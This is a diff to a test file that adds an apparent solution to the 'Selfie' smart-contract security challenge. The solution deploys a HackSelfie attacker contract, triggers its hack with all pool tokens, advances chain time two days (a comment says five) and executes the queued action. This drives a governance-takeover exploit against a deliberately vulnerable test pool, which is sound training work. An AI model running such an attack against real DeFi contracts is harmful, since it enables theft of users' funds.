@@ -39,6 +39,21 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        hackSelfie = await (await ethers.getContractFactory('HackSelfie', deployer)).deploy(
+            pool.address,
+            governance.address,
+            token.address
+        );
+        // We're going to call the hack function inside our smart contract HackSelfie
+        await expect(
+            hackSelfie.connect(player).hack(TOKENS_IN_POOL)
+        ).not.to.be.reverted;
+        // Once we have all set up, we're going to wait 2 days
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
+        // Finally, we're going to call the execute function inside our contract HackSelfie
+        await expect(
+            hackSelfie.connect(player).execute()
+        ).not.to.be.reverted;
     });
 
     after(async function () {
